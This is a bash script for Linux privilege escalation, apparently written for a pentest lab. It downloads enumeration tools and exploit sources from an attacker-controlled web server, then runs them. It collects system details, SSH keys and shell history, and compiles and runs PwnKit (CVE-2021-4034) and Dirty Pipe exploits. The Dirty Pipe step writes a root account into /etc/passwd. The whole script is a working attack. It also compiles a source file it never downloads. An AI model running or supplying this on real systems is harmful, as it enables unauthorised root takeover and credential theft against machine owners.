#!/bin/bash

# Define web server information
websrv_ip='192.168.45.186'
websrv_port='80'

# Function to download files from the web server
download_file() {
    wget "http://$websrv_ip:$websrv_port/$1"
    chmod +x "$1"
}

# Download necessary files
files=("linenum.sh" "linpeas.sh" "linux-exploit-suggester.sh" "linuxprivchecker.py"
        "lse.sh" "xc" "pspy32" "pspy64" "chisel" "traitor-amd64" "traitor-386"
        "gen_libc.py" "exp.c" "dirtypipes1.c" "CVE-2021-4034.py")

for file in "${files[@]}"; do
    download_file "$file"
done

# Run scripts
echo "[+] Running linux smart enumeration scripts..."
./lse.sh > linux-smart-enum-output.txt
echo "[+] Running linenum.sh..."
./linenum.sh > linenum-output.txt
echo "[+] Running linpeas.sh... This takes time, please be patient..."
./linpeas.sh -a > linpeas-output.txt
echo "[+] Running linux-exploit-suggester.sh..."
./linux-exploit-suggester.sh > linux-exploit-suggester-output.txt
echo "[+] Running linuxprivchecker.py..."
./linuxprivchecker.py > linuxprivchecker-output.txt

# Basic information gathering
echo "[+] Running base_info commands"
base_info_commands=("whoami" "id" "cat /etc/passwd" "hostname" "cat /etc/issue"
                    "cat /etc/*-release" "uname -a" "ps aux" "ip a" "ifconfig"
                    "/sbin/route" "ss -anp" "ls -lah /etc/cron*" "cat /etc/crontab"
                    "dpkg -l" "find / -writable -type d 2>/dev/null" "cat /etc/fstab"
                    "mount" "/bin/lsblk" "lsmod" "find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null"
                    "find / -perm -u=s -type f 2>/dev/null" "getcap -r / 2>/dev/null"
                    "find / -name 'id_dsa*' -o -name 'id_rsa*' -o -name 'known_hosts' -o -name 'authorized_hosts' -o -name 'authorized_keys' 2>/dev/null |xargs -r"
                    "history" "find /usr/lib -type f -writable -ls" "netstat -nl" "cat /etc/exports")

for cmd in "${base_info_commands[@]}"; do
    echo "[+] $cmd" >> base_info.txt
    echo ""
    eval "$cmd" >> base_info.txt
    echo ""
    echo ""
    echo ""
done

# Zip the output
echo "[+] Zipping into output.tar.gz..."
tar -czvf output.tar.gz base_info.txt linenum-output.txt linpeas-output.txt linux-exploit-suggester-output.txt linuxprivchecker-output.txt linux-smart-enum-output.txt

# Compilation and execution
if command -v gcc > /dev/null 2>&1; then
    echo "gcc found, proceeding with compilation."

    # Compile cve-2021-4034-poc.c
    gcc cve-2021-4034-poc.c -o cve-2021-4034-poc && ./cve-2021-4034-poc

    # Compile dirtypipes1.c
    gcc dirtypipes1.c -o dirtypipes1 && ./dirtypipes1 /etc/passwd 189 'moxy:$6$THM$wGZt8e3x1sobDByCZytY1/b50pLp6BRrDte5o2LEMYTWkMARgjkbXAHVCGfjdBw6MNTUuRuxUHzW.UJVjqiHw/:0:0::/root:/bin/bash
    '
else
    echo "gcc not found. Please install gcc before running this script."
fi

python3 CVE-2021-4034.py

# Additional instructions
echo "For Looney Toonables:"
echo "python3 gen_libc.py"
echo "gcc -o exp exp.c"
echo "Be patient on Looney Toonables."
echo "Check if you have a 'moxy:moxy' user from dirty pipes."
echo "........DONE!!!"
